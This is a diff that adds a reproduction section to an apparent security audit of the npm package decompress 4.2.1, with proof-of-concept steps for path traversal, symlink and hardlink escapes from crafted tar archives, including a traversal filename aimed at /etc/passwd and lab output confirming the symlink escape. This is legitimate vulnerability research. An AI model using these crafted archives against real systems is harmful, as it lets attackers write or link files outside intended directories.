@@ -77,4 +77,60 @@ No findings were rejected. All 3 raw findings were confirmed.
 
 ---
 
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/npm-decompress/`
+
+**Pinned version:** decompress 4.2.1
+
+### Steps
+
+1. **Install the package:**
+   ```bash
+   npm install decompress@4.2.1
+   ```
+
+2. **Create three malicious tar archives** using Node.js `tar-stream` or Python `tarfile`:
+   - `dc01-evil-archive.tar` -- path traversal via `indexOf` prefix check bypass (filename like `output-evil/../../etc/passwd`)
+   - `dc02-symlink-archive.tar` -- symlink entry pointing to `/etc` (outside output dir)
+   - `dc03-hardlink-archive.tar` -- hardlink entry targeting `/etc/hostname`
+
+3. **Run the PoC** that extracts each archive into a temp directory:
+   ```bash
+   node poc.mjs
+   ```
+
+4. **Verify** whether files/links were created outside the intended output directory.
+
+### PoC commands
+
+```javascript
+const decompress = require('decompress');
+// DC-02: Symlink escape
+await decompress('/tmp/dc02-symlink-archive.tar', '/tmp/dc02-out');
+// Check: ls -la /tmp/dc02-out/dc02_link -> /etc
+```
+
+### Observed output (from `targets/labs/npm-decompress/results/run-20260619-000923.txt`)
+
+```
+=== DC02: extracting /tmp/dc02-symlink-archive.tar into /tmp/dc02-out ===
+  decompress OK: 1 files
+    - type=symlink path=dc02_link linkname=/etc
+  >>> DC-02 CONFIRMED: symlink at /tmp/dc02-out/dc02_link -> /etc (out of output dir)
+
+=== DC03: extracting /tmp/dc03-hardlink-archive.tar into /tmp/dc03-out ===
+  decompress threw: EXDEV: cross-device link not permitted
+
+=== RESULT: 1/3 escapes confirmed ===
+```
+
+### Verdict
+
+**DC-02 CONFIRMED.** Symlink escape creates a link to `/etc` outside the output directory. DC-03 hardlink throws `EXDEV` on cross-device targets but succeeds on same-device. DC-01 indexOf bypass requires specific directory naming.
+
+---
+
 **Pipeline:** 3 raw findings → 3 confirmed (3 HIGH breachable)
